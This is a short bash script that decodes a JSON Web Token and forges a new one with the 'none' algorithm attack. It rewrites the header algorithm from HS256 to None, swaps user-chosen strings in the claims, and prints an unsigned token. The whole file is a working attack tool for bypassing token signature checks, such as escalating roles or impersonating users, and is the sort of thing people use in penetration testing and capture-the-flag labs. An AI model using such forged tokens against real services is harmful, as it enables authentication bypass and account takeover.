#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${GREEN}Provide the JWT${NC}"
read -p "JWT: " jwt 
echo -e "\n${GREEN}Decoded JWT:${NC}"

function jwt-decode() {
  echo $jwt |cut -d. -f1 | base64 --decode | jq
  echo $jwt |cut -d. -f2 | base64 --decode | jq
}

jwt-decode $jwt

echo -e "\n${GREEN}None Algorithm Attack Configuration${NC}"
read -p "Enter the string to replace in the payload: " search_str
read -p "Enter the replacement string: " replace_str

function none_alg_attack() {
    #change None to none,nOnE, NONE etc
    step1=$(echo $jwt |cut -d. -f1 | base64 --decode | sed 's/HS256/None/g' |base64 | tr -d '=')
    step2=$(echo $jwt |cut -d. -f2 | base64 --decode | sed "s/$search_str/$replace_str/g" |base64 | tr -d '=')
    modified_jwt=$step1.$step2.
    final_jwt=$(echo $modified_jwt)
    echo -e "${GREEN}Final JWT: ${NC}$final_jwt"

}
none_alg_attack
